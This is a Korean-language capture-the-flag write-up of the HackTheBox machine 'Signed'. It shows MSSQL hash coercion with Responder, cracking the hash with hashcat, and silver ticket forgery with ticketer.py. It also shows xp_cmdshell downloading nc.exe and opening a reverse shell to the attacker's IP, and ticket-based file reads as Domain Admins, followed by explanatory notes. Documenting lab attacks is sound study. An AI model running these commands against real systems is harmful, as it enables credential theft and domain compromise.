# HTB-SIGNED
```bash
OS: Windows(AD)
DATE: 26.11.04
DIFFICULTY: Medium
```

## RECON
열거를 진행하기 전, 초기 접근할 수 있는 크레덴셜을 얻고 시작하였다. `scott / Sm230#C5NatH`
**nmap**: 초기 검사를 위해 전체 포트 검사와 상세 검사를 진행하였다.
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV -p 1433 IP
```
검사 결과 1433 포트의 MSSQL 서비스만 작동 중인 것을 알게 되었다. 따라서 nxc를 사용하여 초기 접근 크레덴셜이 유효한지 확인해 보았다.
```bash
nxc mssql IP -u scott -p 'Sm230#C5NatH'
```
시도한 결과 윈도우 계정이 아닌 것 같아 SQL 인증을 진행하였다.
```bash
nxc mssql IP -u scott -p 'Sm230#C5NatH' --local-auth
```
그 결과 존재하는 계정인 것을 확인할 수 있었다.

## Initial Access
이제 `mssqlclient.py`를 사용하여 SQL에 접속해 주었다.
```bash
mssqlclient.py SIGNED.HTB/scott:'Sm230#C5NatH'@IP

SQL (scott  guest@master)>
```
접속하여 DB들을 확인해 보았지만 기본 DB밖에 없었다. 따라서 xp_dirtree를 사용하여 내 IP로 공유 폴더 접속을 유도해, hash를 얻을 수 있을지 확인해 보았다. 먼저 responder를 켜 주었다.
```bash
sudo responder -I tun0
```
이후 SQL에서 공유 폴더 접속을 시도해 보았다.
```bash
SQL (scott  guest@master)> exec master..xp_dirtree '\\IP\share\test.txt'
```
```bash
sudo responder -I IP

[+] Listening for events...

[*] Skipping previously captured hash for SIGNED\mssqlsvc
```
시도한 결과 mssqlsvc 유저의 hash를 얻을 수 있었다. 이것을 hashcat을 사용하여 크랙해 주었다.
```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```
크랙에 성공하여 mssqlsvc 유저의 평문 크레덴셜을 얻을 수 있었고, 대상 유저로 MSSQL 접속을 시도하였다.
```bash
mssqlclient.py SIGNED.HTB/MSSQLSVC:'purPLE9795!@'@10.129.242.173 -windows-auth
```
이후 많은 것을 열거하고 확인하였지만 아무것도 되지 않았다. 따라서 내가 가지고 있는 계정이 MSSQL 서비스 계정이기 때문에, 서비스 Silver ticket을 시도해 보았다. 먼저 지금 현재 계정 그대로 하면 의미가 없기에 누가 sysadmin인지 확인해 주었다.
```sql
SQL>enum_logins
sa                                  SQL_LOGIN                 0          1               0             0            0              0           0           0           0
##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0
##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0
SIGNED\IT                           WINDOWS_GROUP             0          1               0             0            0              0           0           0           0
```
확인해 본 결과 **IT**라는 그룹이 sysadmin 권한으로 동작한다는 것을 알게 되었다. 따라서 silver ticket을 만들기 위한 준비물인 NTLM 해시, 도메인 SID, SPN, 그룹 RID 이 네 가지를 얻어야 만들 수 있기에, NTLM 해시부터 얻어보았다. 먼저 평문 비번을 아니까 NTLM 해시로 만들어 주는 코드를 작성하여 시도하였다.
```python
python3 -c 'import hashlib; print(hashlib.new("md4", "purPLE9795!@".encode("utf-16le")).hexdigest())'
```
이로써 NT 해시를 얻었고, 다음으로 도메인 SID를 얻기 위해 MSSQL에서 명령어를 사용하여 출력해 주었다.
```sql
sql> SELECT SUSER_SID('SIGNED\Domain Users');

b'0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000'
```
결과는 바이트 형식으로 나오기 때문에, 바이트를 평문으로 변환하는 명령어를 사용해 주었다.
```python
python3 -c "from impacket.dcerpc.v5.dtypes import SID; print(SID(bytes.fromhex('0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000')).formatCanonical())"
→ S-1-5-21-4088429403-1159899800-2753317549-513
```
여기서 티켓은 도메인 SID를 요구하기 때문에, 개인 번호인 RID 513 부분은 빼고 추출한다. 이후 다음 준비물인 SPN을 확인한다. 지금 티켓 서비스가 MSSQL이기 때문에 전용 서비스 클래스인 MSSQLSvc를 적고 FQDN 그리고 포트 형식으로 추출하면, SPN은 `MSSQLSvc/DC01.signed.htb:1433` 형식이 나온다. 이제 마지막으로 그룹 RID를 추출해 주었다.
```sql
sql> SELECT SUSER_SID('SIGNED\IT');

b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'
```
아까 도메인 SID를 추출했던 것과 같이 IT 그룹 SID를 추출한 후 평문으로 바꿔 주었다.
```python
python3 -c "from impacket.dcerpc.v5.dtypes import SID; print(SID(bytes.fromhex('0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000')).formatCanonical())"

S-1-5-21-4088429403-1159899800-2753317549-1105
```
이번엔 도메인 부분을 빼고 대상 그룹 RID인 1105만 얻어준다. 이제 준비물을 다 모았으니 실버 티켓을 추출해 준다.
```bash
ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 Administrator
```
이로써 **Administrator.ccache**를 얻을 수 있었고, 이것을 티켓으로 저장한 후 Kerberos 인증과 no-pass 옵션을 추가하여 접속하였다.
```bash
export KRB5CCNAME=Administrator.ccache 
```
```bash
mssqlclient.py -no-pass -k DC01.signed.htb -windows-auth
```
이로써 진짜 SQL admin으로 접속이 가능하였다. 이제 xp_cmdshell 같은 명령어도 사용할 수 있기에, 허용해 주고 whoami 명령을 사용해 보았다.
```sql
sql > enable_xp_cmdshell
sql > xp_cmdshell whoami

output            
---------------   
signed\mssqlsvc   
NULL              
```
초기에 오해가 있었던 게, 분명 실버 티켓으로 admin으로 접속했다고 생각했지만 whoami 결과는 똑같은 유저인 mssqlsvc 유저였다. 알고 보니 권한은 admin이 맞지만 실제 유저는 mssqlsvc였다는 것이었다. 하지만 이제 명령을 사용할 수 있기에, 먼저 쉘로 연결해 주었다.
```sql
sql > xp_cmdshell "powershell -c wget IP:9999/nc.exe -outfile nc.exe"
sql > xp_cmdshell "nc.exe -e powershell IP 4444"
```
이렇게 nc.exe 프로그램을 받아 주고, 내가 리스닝하고 있는 포트로 연결이 들어와 초기 유저 쉘을 얻을 수 있었다.

![user](attach_real/Pasted%20image%2020261104145341.png)

## Privilege Escalation
이제 admin으로 권한 상승하기 위해 여러 권한 상승 경로를 찾아보았지만 나오지 않았다. 다시 SQL에서, cmd.exe를 띄우지 않고 OPENROWSET으로 MSSQL 엔진이 직접 파일을 읽게 하여, 이때 티켓에 넣은 그룹 권한을 써서 admin 폴더를 읽을 수 있게 해보았다. 이러려면 아까 만든 티켓이 아니라 새로 만들어 주어야 했다. 먼저 앞의 것에서 두 개의 옵션이 추가된다. -user-id, -groups에서 Domain Admins와 아까의 IT(DB sysadmin) 두 개를 넣어줘야 한다.
```bash
ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc \
  -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
  -domain signed.htb \
  -spn MSSQLSvc/DC01.signed.htb:1433 \
  -user-id 1103 \          ← 추가 1
  -groups '512,1105' \     ← 추가 2
  doesntmatter
```
```bash
export KRB5CCNAME=doesntmatter.ccache
```
```bash
mssqlclient.py -no-pass -k DC01.signed.htb
```
이후 SQL에 접속하여 OPENROWSET 명령어를 사용하여 읽어 주었다.
```sql
sql > SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
```
이로써 root 플래그를 얻을 수 있었다.

![root](attach_real/Pasted%20image%2020261104153951.png)

## New Inform 
- Kerberos 티켓은 도메인 IP가 아니더라도 접속 시도가 가능하다
- Silver ticket이란, 내가 서비스 계정 해시를 알면 DC 없이 직접 TGS를 위조할 수 있는 것이다. 안에 "나 관리자야"라고 적고 서비스 키로 봉인하면, MSSQL은 자기 키로 열리니까 믿어버림
- Golden Ticket = krbtgt 해시 보유 -> TGT 위조 -> 모든 서비스 (도메인 장악)
- Silver ticket = 서비스 계정 해시 보유 -> TGS 위조 -> 그 서비스만
- 서비스 계정은 일반 유저보다 더 가치가 높다
- mssqlsvc와 같이 서비스를 돌리는 계정을 봤을 때, 그 계정은 MSSQL TGS를 봉인하는 키의 주인. 그 키를 얻었으면 MSSQL용 Silver ticket을 만들 수 있다
- 그냥 로그인해봤자 권한이 낮다. 그래서 누가 sysadmin인지 확인한다. ex: sysadmin 그룹 확인
- `enum_logins` 명령어가 sysadmin 권한을 가진 계정이 무엇인지 알려주는 것
- silver ticket 준비물: NTLM 해시, 도메인 SID, SPN, 그룹 RID
- SID란 윈도우에서 모든 계정·그룹에 붙는 고유 번호(주민번호). 이름은 바뀔 수 있어도 SID는 안 바뀐다
- SID 구조 = 도메인 SID(이 도메인의 공통 부분) - RID(개인 번호). 도메인 SID는 같은 도메인의 모든 계정이 공유함. RID는 그 도메인 안에서 개인을 구분하는 이름으로, 계정마다 다름
- 유명 RID = 500: Administrator, 512: Domain Admins, 513: Domain Users
- MSSQL은 바이너리를 HEX로 표현함. 그럴 때마다 변환
- SPN이란 어느 서버의 어느 서비스냐를 가리키는 주소. Kerberos가 "이 티켓은 어느 서비스용인지" 구분하기 위한 것. 형식: `서비스클래스/호스트이름[:포트]`
- SPN은 서비스 클래스가 서비스 종류마다 정해져 있다. ex: MSSQLSvc, CIFS
- 실버 티켓을 추출할 때 -user-id가 없으면 실존 유저 이름을 적어줘야 한다
- 실버 티켓 만들 때 그룹도 SID로 식별되고, 이름이 아니라 RID를 적어줘야 한다
- 실버 티켓으로 서비스에 들어와도, 서비스에서는 ADMIN인데 OS 명령에서는 일반 유저일 수 있다
- SQL 서비스 실버 티켓에 한정하여 OPENROWSET이라는 MSSQL만의 기능으로 악용할 수 있다. xp_cmdshell은 MSSQL한테 명령을 실행해달라고 하면 MSSQL이 밖에 나가서 cmd.exe를 실행하는 새 프로세스를 가지고 옴. 그리고 그 프로그램이 mssqlsvc 신분증을 달고 일함. 그래서 mssqlsvc 권한. 하지만 OPENROWSET은 MSSQL한테 "이 파일 읽어달라"고 하면 MSSQL이 직접 읽음. 이때 내가 제출한 티켓의 신분으로 읽는다. 티켓에 domain admins를 넣었으면 그 권한으로 읽음
- 따라서 OPENROWSET에는 domain admin의 RID도 추가해 주어야 한다. 근데 왜 -user-id 1103(mssqlsvc)이 필요한가? 이때 중요한 함정이 있다. MSSQL은 티켓 주인이 자기 서비스 계정일 때만 그 티켓의 그룹을 신뢰해서 파일 접근에 사용한다